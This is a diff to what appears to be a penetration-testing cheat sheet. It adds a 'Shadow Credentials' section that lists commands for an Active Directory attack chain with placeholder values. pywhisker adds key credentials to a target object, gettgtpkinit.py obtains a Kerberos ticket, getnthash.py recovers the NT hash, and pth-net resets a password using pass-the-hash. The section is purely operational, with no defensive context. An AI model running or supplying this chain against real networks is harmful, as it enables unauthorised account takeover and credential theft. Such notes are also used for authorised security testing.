@@ -150,6 +150,7 @@ Thank you for reading.
 		- [Rubeus](#rubeus)
 		- [RunasCs](#runascs)
 		- [Seatbelt](#seatbelt)
+		- [Shadow Credentials](#shadow-credentials)
 		- [smbpasswd](#smbpasswd)
 		- [winexe](#winexe)
 	- [Social Engineering Tools](#social-engineering-tools)
@@ -6403,6 +6404,36 @@ srvinfo
 .\Seatbelt.exe -group=system
 .\Seatbelt.exe -group=all
 .\Seatbelt.exe -group=all -full
+```
+
+#### Shadow Credentials
+
+```c
+python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
+```
+
+```c
+python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
+```
+
+```c
+python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
+```
+
+```c
+python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache 
+```
+
+```c
+export KRB5CCNAME=<USERNAME>.ccache
+```
+
+```c
+python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
+```
+
+```c
+pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
 ```
 
 #### smbpasswd
